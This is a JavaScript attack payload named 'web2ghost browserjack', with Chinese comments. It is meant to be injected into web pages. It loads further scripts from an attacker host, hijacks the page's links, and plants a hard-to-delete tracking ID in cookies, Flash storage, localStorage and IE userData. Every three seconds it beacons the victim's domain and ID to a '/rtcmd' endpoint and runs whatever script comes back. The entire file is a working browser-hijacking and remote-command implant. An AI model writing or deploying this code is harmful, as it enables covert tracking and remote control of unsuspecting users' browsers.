/*
web2ghost browserjack
by cosine
evilcos@gmail.com
*/

w2g_site = 'http://{IP}:8000';

function inj_script(src,onload){
	o = document.createElement("script");
	o.src = src;
	if(onload){
		if (!/*@cc_on!@*/0) {
			o.onload = onload;
		}else{
			o.onreadystatechange = function () {
				if (o.readyState == 'loaded' || o.readyState == 'complete') {
					onload();
				}
			}
		}
	}
	document.getElementsByTagName("body")[0].appendChild(o);
	return o;
}
function remove_obj(o){
	document.body.removeChild(o);
}

function hijack_links(){
	setTimeout(function(){w2g.hijack.links(w2g_site+"/payloads/lib/browserjack.js");},1000);
}

inj_script(w2g_site+'/payloads/lib/w2g.js',hijack_links);

/* 水印 */
watermark = {
	'name': '__utmwg', // 水印名
	'value': ''
};

watermark.$ = function(id){return document.getElementById(id);};
watermark.createElem = function(elname, name, append){
	/*创建一个标签对象*/
	var el;
	if (typeof name != 'undefined' && document.getElementById(name))
		el = document.getElementById(name);
	else
		el = document.createElement(elname);
	//el.style.visibility = 'hidden';
	//el.style.position = 'absolute';
	//hidden后加载swf居然在ie下执行不了，神奇的差异！！！
	if (name)
		el.setAttribute('id', name);
	if (append)
		document.body.appendChild(el);
	return el;
};

watermark.inj_w2gcookie_swf = function() {
	var o = watermark.createElem('div','w2g_swf_div',1);
	if (window.ActiveXObject) { // 兼容maxthon3 ie模式，神奇的差异……
		var x = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="w2gswf" width="500" height="10">';
	}else{
		var x = '<object type="application/x-shockwave-flash" data="'+w2g_site+'/payloads/lib/w2gcookie.swf" width="500" height="10" id="w2gswf">';
	}
	x = x +
		'<param name="bgcolor" value="#333333" />' +
		'<param name="movie" value="'+w2g_site+'/payloads/lib/w2gcookie.swf" />' +
		'<param name="allowScriptAccess" value="always" /> ' +
	    '</object>';
	o.innerHTML = x;
	//alert(o.innerHTML); // 差异看这
};

watermark.cookie = {};
watermark.cookie.set = function(name, value, expires, path, domain, secure){
	/*添加cookie，参数说明：
	expires: 'Wed, 24 Aug 2012 08:50:46 GMT'
	path: 可以设置子目录
	domain: 可以设置本域及父域
	secure: 随便指定一个值就是secure，这样的cookie将在SSL层传输
	*/
	document.cookie = name + "=" + escape(value) +
	((expires) ? "; expires=" + expires : "") +
	((path) ? "; path=" + path : "") +
	((domain) ? "; domain=" + domain : "") +
	((secure) ? "; secure" : "");
};

watermark.cookie.get = function(name){
	/*获取指定name的cookie值*/
    var i, x, y, cookie_array = document.cookie.split(";");
    for (i = 0; i < cookie_array.length; i++) {
        x = cookie_array[i].substr(0, cookie_array[i].indexOf("="));
        y = cookie_array[i].substr(cookie_array[i].indexOf("=") + 1);
        x = x.replace(/^\s+|\s+$/g, "");
        if (x == name) {
            return unescape(y);
        }
    }
};

watermark.set = function(name,value){
	/*设置水印*/
	watermark.value = value; // 设置全局水印值
	watermark.cookie.set(name,value,'Wed, 24 Aug 2212 08:50:46 GMT');
	watermark.flash(name,value);
	watermark.local_storage(name,value);
	watermark.userdata(name,value);
};

watermark.get = function(name){
	/*读取水印*/
	if(watermark.value){ // 如果全局里有水印值就直接返回
		return watermark.value;
	}
	var value;
	value = watermark.flash(name);
	if(value){
		watermark.set(name, value);
		return value;
	}else{
		value = watermark.local_storage(name)||watermark.userdata(name)||watermark.cookie.get(name);
		if(value){
			watermark.set(name, value);
			return value;
		}else{
			value = watermark.unique_value();
			watermark.set(name, value);
			return value;
		}
	}
};

watermark.userdata = function(name,value){
	/*IE下的userData储存*/
	try {
		var elm = watermark.createElem('div', 'userdata_el', 1);
		elm.style.behavior = "url(#default#userData)";
		if (typeof(value) != "undefined"){
			elm.setAttribute(name, value);
			elm.save(name);
		}
		else{
			elm.load(name);
			return elm.getAttribute(name);
		}
	} catch(e) { }
};

watermark.flash = function(name,value){
	/*flash的lso储存，跨浏览器的*/
	try{
		if (typeof(value) != "undefined"){
			watermark.$('w2gswf').set_watermark(name,value);
		}else{
			return watermark.$('w2gswf').get_watermark(name);
		}
	} catch (e) { }
};

watermark.local_storage = function(name,value){
	/*HTML5里的本地储存，新浏览器一般都支持*/
	try{
		if (window.localStorage){
			if (typeof(value) != "undefined")
				localStorage.setItem(name, value);
			else
				return localStorage.getItem(name);
		}
	} catch (e) { }
};

watermark.unique_value = function(){
	var now = new Date().getTime();
	var unique_value = Math.random()*(999999999999999-now+1)+now;
	return unique_value.toString();
};
///////////////////////////////////////////

function json2str(o) {
	var arr = [];
	var fmt = function(s) {
		if (typeof s == 'object' && s != null) return json2str(s);
		return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
	};
	for (var i in o) arr.push("'" + i + "':" + fmt(o[i]));
	return '{' + arr.join(',') + '}';
}

var info={};
info.domain = document.domain;
var watermark_id = watermark.get(watermark.name);
info.id = watermark_id;
var private_info = json2str(info);

setInterval(function(){
	var rtcmd = inj_script(w2g_site+'/rtcmd?i='+private_info+'&date='+new Date().getTime());
	setTimeout(function(){remove_obj(rtcmd);}, 500);
	},
3000);

